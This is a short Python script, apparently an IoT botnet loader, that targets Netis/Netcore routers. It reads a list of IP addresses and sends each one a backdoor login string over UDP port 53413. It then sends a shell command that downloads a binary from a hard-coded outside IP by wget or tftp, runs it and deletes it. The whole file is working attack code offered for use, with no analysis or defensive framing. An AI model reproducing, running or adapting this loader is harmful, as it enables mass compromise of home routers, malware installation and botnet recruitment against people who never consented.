#! python !#
#By; LiGhT
import threading, sys, time, random, socket, re, os

commandpayload = "AA\x00\x00AAAA cd /var/; rm -rf sshd; wget http://103.194.169.245/sshd || tftp -r sshd -g 103.194.169.245; chmod 777 sshd; ./sshd; rm -rf sshd\x00" # MIPSEL Binary
loginpayload = "AAAAAAAAnetcore\x00" #DONT CHANGE
ips = open(sys.argv[1], "r").readlines()

class netis(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				print "Attempting %s"%(self.ip)
				s.sendto(loginpayload, (self.ip, 53413))
				time.sleep(1.5)
				s.sendto(commandpayload, (self.ip, 53413))
				time.sleep(3)
			except Exception:
				pass

for ip in ips:
	try:
		n = netis(ip)
		n.start()
		time.sleep(0.01)
	except:
		pass